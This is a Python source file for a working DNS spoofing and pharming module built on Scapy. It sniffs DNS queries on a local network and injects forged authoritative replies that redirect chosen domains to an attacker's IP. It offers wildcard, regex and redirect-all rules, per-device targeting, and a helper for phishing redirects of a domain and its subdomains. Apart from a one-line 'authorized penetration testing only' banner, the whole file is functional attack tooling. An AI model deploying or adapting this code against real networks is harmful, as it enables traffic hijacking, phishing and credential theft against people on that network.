"""
╔══════════════════════════════════════════════════════════════════════╗
║   💉 DNS Spoofer / Pharming Module                                   ║
║                                                                      ║
║   Intercepts DNS queries on the network and injects fake replies     ║
║   to redirect specific domains to attacker-controlled IPs.           ║
║                                                                      ║
║   Features:                                                          ║
║     • Real-time DNS query interception via Scapy                     ║
║     • Per-domain spoofing rules (redirect to any IP)                 ║
║     • Wildcard domain matching (*.example.com)                       ║
║     • Regex-based domain matching                                    ║
║     • Auto-redirect mode (all DNS → your IP)                        ║
║     • Spoof logging and statistics                                   ║
║     • Selective target spoofing (spoof only specific devices)        ║
║                                                                      ║
║   Requires: ARP spoofing active (traffic flowing through us)         ║
║   ⚠ For authorized penetration testing only!                        ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import threading
import time
import re
import os
from datetime import datetime
from collections import defaultdict, deque

try:
    from scapy.all import (
        IP, UDP, DNS, DNSQR, DNSRR,
        sniff, send, sendp, Ether, conf,
        get_if_hwaddr
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False


class SpoofRule:
    """A single DNS spoofing rule."""

    def __init__(self, domain_pattern, redirect_ip, rule_type="exact",
                 targets=None, ttl=600, description=""):
        self.domain_pattern = domain_pattern.lower().rstrip(".")
        self.redirect_ip = redirect_ip
        self.rule_type = rule_type  # exact, wildcard, regex, all
        self.targets = targets or []  # Empty = all devices
        self.ttl = ttl
        self.description = description
        self.hit_count = 0
        self.last_hit = None
        self.created = datetime.now()

        # Pre-compile regex if needed
        self._regex = None
        if rule_type == "regex":
            try:
                self._regex = re.compile(domain_pattern, re.IGNORECASE)
            except re.error:
                self._regex = None
        elif rule_type == "wildcard":
            # Convert wildcard to regex: *.example.com → .*\.example\.com
            escaped = re.escape(domain_pattern).replace(r"\*", ".*")
            self._regex = re.compile(f"^{escaped}$", re.IGNORECASE)

    def matches(self, domain, device_ip=None):
        """Check if this rule matches a domain query."""
        domain = domain.lower().rstrip(".")

        # Check target filter
        if self.targets and device_ip and device_ip not in self.targets:
            return False

        if self.rule_type == "all":
            return True
        elif self.rule_type == "exact":
            return domain == self.domain_pattern
        elif self.rule_type in ("wildcard", "regex") and self._regex:
            return bool(self._regex.match(domain))

        return False

    def to_dict(self):
        return {
            "pattern": self.domain_pattern,
            "redirect": self.redirect_ip,
            "type": self.rule_type,
            "targets": self.targets,
            "ttl": self.ttl,
            "description": self.description,
            "hits": self.hit_count,
            "last_hit": self.last_hit.strftime("%H:%M:%S") if self.last_hit else None,
            "created": self.created.strftime("%H:%M:%S"),
        }


class DNSSpoofer:
    """
    Intercepts DNS queries and injects spoofed responses.

    Prerequisites:
      - ARP spoofing must be active (so DNS traffic flows through us)
      - IP forwarding enabled
      - Run as root

    Usage:
      spoofer = DNSSpoofer(interface="wlan0", local_ip="192.168.1.100")
      spoofer.add_rule("facebook.com", "192.168.1.100")  # Redirect FB to us
      spoofer.add_rule("*.google.com", "192.168.1.100", rule_type="wildcard")
      spoofer.start()
    """

    def __init__(self, interface, local_ip, gateway_ip=None):
        self.interface = interface
        self.local_ip = local_ip
        self.gateway_ip = gateway_ip
        self._running = False
        self._lock = threading.Lock()

        # Spoofing rules
        self._rules = []

        # Spoof log
        self._spoof_log = deque(maxlen=1000)

        # Statistics
        self._stats = {
            "queries_seen": 0,
            "queries_spoofed": 0,
            "queries_passed": 0,
        }

        # Per-device spoof counts
        self._device_spoofs = defaultdict(int)

        # Callback for spoofed queries
        self._callbacks = []

    # ═══════════════════════════════════════════════════════════════════
    # RULE MANAGEMENT
    # ═══════════════════════════════════════════════════════════════════

    def add_rule(self, domain_pattern, redirect_ip=None, rule_type="exact",
                 targets=None, ttl=600, description=""):
        """
        Add a DNS spoofing rule.

        Args:
            domain_pattern: Domain to spoof (e.g., "facebook.com", "*.google.com")
            redirect_ip: IP to redirect to (default: self.local_ip)
            rule_type: "exact", "wildcard", "regex", or "all"
            targets: List of device IPs to target (empty = all devices)
            ttl: TTL for spoofed DNS response
            description: Human-readable description
        """
        ip = redirect_ip or self.local_ip
        rule = SpoofRule(
            domain_pattern=domain_pattern,
            redirect_ip=ip,
            rule_type=rule_type,
            targets=targets or [],
            ttl=ttl,
            description=description or f"Redirect {domain_pattern} → {ip}",
        )
        with self._lock:
            self._rules.append(rule)
        self._log(f"RULE ADDED: {domain_pattern} → {ip} ({rule_type})")
        return rule

    def remove_rule(self, domain_pattern):
        """Remove a spoofing rule by pattern."""
        with self._lock:
            self._rules = [r for r in self._rules
                           if r.domain_pattern != domain_pattern.lower()]
        self._log(f"RULE REMOVED: {domain_pattern}")

    def clear_rules(self):
        """Remove all spoofing rules."""
        with self._lock:
            self._rules.clear()
        self._log("ALL RULES CLEARED")

    def add_rickroll(self, redirect_ip=None):
        """Redirect all traffic to a rickroll page."""
        ip = redirect_ip or self.local_ip
        self.add_rule("*", ip, rule_type="all",
                      description="🎵 RICKROLL — All DNS redirected")

    def add_phishing_rule(self, domain, redirect_ip=None):
        """Add a phishing redirect for a specific domain + subdomains."""
        ip = redirect_ip or self.local_ip
        self.add_rule(domain, ip, rule_type="exact",
                      description=f"🎣 Phishing: {domain}")
        self.add_rule(f"*.{domain}", ip, rule_type="wildcard",
                      description=f"🎣 Phishing: *.{domain}")

    # ═══════════════════════════════════════════════════════════════════
    # DNS INTERCEPTION
    # ═══════════════════════════════════════════════════════════════════

    def start(self):
        """Start DNS spoofing."""
        if not SCAPY_OK:
            self._log("ERROR: Scapy not available")
            return False

        self._running = True
        self._log("DNS Spoofer STARTED")

        # Start sniffing thread
        threading.Thread(target=self._sniff_dns, daemon=True).start()
        return True

    def stop(self):
        """Stop DNS spoofing."""
        self._running = False
        self._log("DNS Spoofer STOPPED")

    def _sniff_dns(self):
        """Sniff for DNS queries on the network."""
        try:
            sniff(
                iface=self.interface,
                filter="udp port 53",
                prn=self._process_dns_packet,
                store=0,
                stop_filter=lambda _: not self._running,
            )
        except Exception as e:
            self._log(f"Sniff error: {e}")

    def _process_dns_packet(self, packet):
        """Process a captured DNS packet."""
        try:
            if not packet.haslayer(DNS) or not packet.haslayer(DNSQR):
                return
            if not packet.haslayer(IP):
                return

            # Only process queries (QR=0), not responses
            dns_layer = packet[DNS]
            if dns_layer.qr != 0:
                return

            src_ip = packet[IP].src
            dst_ip = packet[IP].dst

            # Don't spoof our own queries
            if src_ip == self.local_ip:
                return

            qname = dns_layer.qd.qname.decode("utf-8", errors="ignore").rstrip(".")
            qtype = dns_layer.qd.qtype  # 1=A, 28=AAAA, etc.

            self._stats["queries_seen"] += 1

            # Only spoof A records (IPv4)
            if qtype != 1:
                return

            # Check rules
            matched_rule = None
            with self._lock:
                for rule in self._rules:
                    if rule.matches(qname, src_ip):
                        matched_rule = rule
                        break

            if matched_rule:
                self._inject_dns_response(packet, qname, matched_rule)
                matched_rule.hit_count += 1
                matched_rule.last_hit = datetime.now()
                self._stats["queries_spoofed"] += 1
                self._device_spoofs[src_ip] += 1

                spoof_entry = {
                    "time": datetime.now().strftime("%H:%M:%S"),
                    "device": src_ip,
                    "domain": qname,
                    "redirect": matched_rule.redirect_ip,
                    "rule": matched_rule.domain_pattern,
                }
                with self._lock:
                    self._spoof_log.append(spoof_entry)

                # Callbacks
                for cb in self._callbacks:
                    try:
                        cb(spoof_entry)
                    except Exception:
                        pass
            else:
                self._stats["queries_passed"] += 1

        except Exception:
            pass

    def _inject_dns_response(self, original_packet, qname, rule):
        """Craft and send a spoofed DNS response."""
        try:
            ip_layer = original_packet[IP]
            udp_layer = original_packet[UDP]
            dns_layer = original_packet[DNS]

            # Build spoofed response
            spoofed = (
                IP(
                    src=ip_layer.dst,
                    dst=ip_layer.src,
                ) /
                UDP(
                    sport=udp_layer.dport,
                    dport=udp_layer.sport,
                ) /
                DNS(
                    id=dns_layer.id,
                    qr=1,       # Response
                    aa=1,       # Authoritative
                    rd=1,       # Recursion desired
                    ra=1,       # Recursion available
                    qd=dns_layer.qd,
                    an=DNSRR(
                        rrname=dns_layer.qd.qname,
                        type="A",
                        rclass="IN",
                        ttl=rule.ttl,
                        rdata=rule.redirect_ip,
                    ),
                )
            )

            send(spoofed, verbose=False, iface=self.interface)

        except Exception as e:
            self._log(f"Inject error: {e}")

    # ═══════════════════════════════════════════════════════════════════
    # CALLBACKS & API
    # ═══════════════════════════════════════════════════════════════════

    def on_spoof(self, callback):
        """Register callback for spoofed queries."""
        self._callbacks.append(callback)

    def get_rules(self):
        """Get all active spoofing rules."""
        with self._lock:
            return [r.to_dict() for r in self._rules]

    def get_spoof_log(self, limit=50, device_ip=None):
        """Get recent spoof events."""
        with self._lock:
            log = list(self._spoof_log)
        if device_ip:
            log = [e for e in log if e["device"] == device_ip]
        return log[-limit:]

    def get_stats(self):
        """Get spoofing statistics."""
        return {
            **self._stats,
            "rules_count": len(self._rules),
            "devices_spoofed": dict(self._device_spoofs),
        }

    def _log(self, msg):
        """Internal logging."""
        with self._lock:
            self._spoof_log.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "device": "SYSTEM",
                "domain": "",
                "redirect": "",
                "rule": msg,
            })
